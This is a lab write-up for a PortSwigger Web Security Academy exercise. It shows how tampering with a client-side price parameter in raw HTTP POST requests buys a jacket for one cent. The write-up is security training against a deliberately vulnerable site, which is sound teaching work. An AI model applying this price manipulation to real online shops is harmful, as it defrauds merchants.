# [Lab 1: Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)

---

## Description

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

Log in to the web application using the credentials `wiener:peter`.

Navigate to the "Lightweight l33t leather jacket" and add it to your cart, generating the following request.

```http
POST /cart HTTP/1.1
Host: ac211f731e9f6d0480a9b1de0079007c.web-security-academy.net
Cookie: session=x61gsATNrNSE8LKBcD648e9oo38lVqsh
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://ac211f731e9f6d0480a9b1de0079007c.web-security-academy.net
Dnt: 1
Referer: https://ac211f731e9f6d0480a9b1de0079007c.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1&price=133700
```

A `POST` request to `/cart` with the product ID, quantity, and price defined in the body. The successful response is a 302 redirect to `/product?productId=1`.

Typically in this kind of application, the price of the product would be stored with the rest of the product information in some backend data store. The client would define which product they want (`productId`) and how much of it they want (`quantity`), but the price would be fetched from the datastore. The fact that this form includes a field for the price gives away that there may be a logic flaw here. Perhaps the backend stores the cart info on the backend with the user-defined price.

Attempt to chance the `price` to make the jacket free.

```http
POST /cart HTTP/1.1
Host: ac211f731e9f6d0480a9b1de0079007c.web-security-academy.net
Cookie: session=x61gsATNrNSE8LKBcD648e9oo38lVqsh
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: https://ac211f731e9f6d0480a9b1de0079007c.web-security-academy.net
Dnt: 1
Referer: https://ac211f731e9f6d0480a9b1de0079007c.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1&price=0
```

```http
HTTP/1.1 302 Found
Location: /product?productId=1
Connection: close
Content-Length: 0
```

Navigate to `/cart` in the browser to see if the jacket was added.

It was not.

Perhaps there is an issue with trying to input a price of `0`. Notice that the input price of `133700` ends up being `1337.00`. The application appears to be taking the input price as an integer and dividing it by 100. Attempt to add the jacket with a price of `1`, which should result in a price of 1 cent.

```http
POST /cart HTTP/1.1
Host: ac211f731e9f6d0480a9b1de0079007c.web-security-academy.net
Cookie: session=x61gsATNrNSE8LKBcD648e9oo38lVqsh
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: https://ac211f731e9f6d0480a9b1de0079007c.web-security-academy.net
Dnt: 1
Referer: https://ac211f731e9f6d0480a9b1de0079007c.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1&price=1
```

```http
HTTP/1.1 302 Found
Location: /product?productId=1
Connection: close
Content-Length: 0
```

Navigate to `/cart` in the browser to see if the jacket was added.

It was, and with the price of 1 cent!

![](images/Pasted%20image%2020210820204145.png)

Place the order to complete the challenge.

![](images/Pasted%20image%2020210820204518.png)
